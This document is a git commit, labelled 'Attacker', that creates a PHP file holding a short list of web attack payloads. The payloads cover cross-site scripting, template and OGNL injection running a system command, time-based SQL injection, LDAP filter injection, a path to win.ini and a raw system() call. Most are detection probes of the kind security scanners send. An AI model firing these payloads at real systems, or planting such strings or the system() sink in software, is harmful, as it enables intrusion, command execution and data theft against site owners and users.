980d2ca51b08052f963107c7dd5f93b279db5a2d
Mehdicrb123 <159590556+Mehdicrb123@users.noreply.github.com>
2024-11-18 22:53:29 +0100

    Create Hacker.php
    Attacker
    MEHDI BOUARAR

---
+++ Hacker.php
@@ -0,0 +1,16 @@
+{{"test".toUpperCase()}}
+<a href="javascript:document.body.innerHTML='<img src=x onerror=alert(1)>'">Click me</a>
+${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('printf %s%s%s TSUNAMI_PAYLOAD_START 81a534fe1795845c TSUNAMI_PAYLOAD_END').getInputStream(), 'utf-8'))}.(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader('x-cmd-response', #a))"
+C:\windows\win.ini
+<script> setInterval(function() { alert('XSS Test'); }, 1000); </script>
+<script>
+  setInterval(function() {
+    alert('XSS Test');
+  }, 1000);
+</script>
+<ScRiPt >vQjS(9073)</ScRiPt>
+?id=*
+system($this->data);
+">'><script>alert(document.domain)</script>
+username=0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z
+*)(uid=*))(|(uid=*)(userPassword=*)(&(objectClass=person))
